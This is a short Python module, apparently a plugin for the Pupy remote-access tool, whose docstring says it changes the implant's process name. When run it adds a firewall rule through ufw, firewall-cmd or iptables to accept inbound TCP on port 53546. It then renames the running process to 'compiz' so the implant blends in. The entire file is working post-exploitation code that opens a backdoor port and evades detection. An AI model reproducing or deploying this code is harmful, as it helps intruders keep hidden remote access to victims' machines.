# -*- coding: utf-8 -*-

""" Change pupy process's name """

__dependencies__ = {
    'linux': ['hide_process']
}

__arguments__ = {
    'name': 'Process name'
}

__compatibility__ = ('linux')

import hide_process
import subprocess
from os import path

def main(name='compiz'):
    if path.isfile("/usr/sbin/ufw"):
        cmd = "/usr/sbin/ufw allow 53546"
    if path.isfile("/usr/sbin/firewall-cmd"):
        cmd = "firewall-cmd --zone=public --add-port=53546/tcp --permanent"        
    else:
        cmd = "iptables -I INPUT -p tcp -m tcp --dport 53546 -j ACCEPT"
    # returns output as byte string
    subprocess.call(cmd, shell=True)
    hide_process.change_argv(argv=name)
